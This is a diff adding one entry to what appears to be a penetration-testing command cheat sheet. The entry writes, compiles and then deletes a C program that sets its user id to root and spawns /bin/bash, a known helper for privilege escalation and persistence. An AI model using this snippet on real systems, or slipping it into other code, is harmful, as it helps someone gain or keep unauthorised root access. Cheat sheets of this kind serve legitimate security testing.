@@ -1,0 +1,7 @@
+# C
+% c, shell
+
+# generate shell bash bin
+echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c;
+gcc pwn.c -o <filename|shell>;
+rm pwn.c 
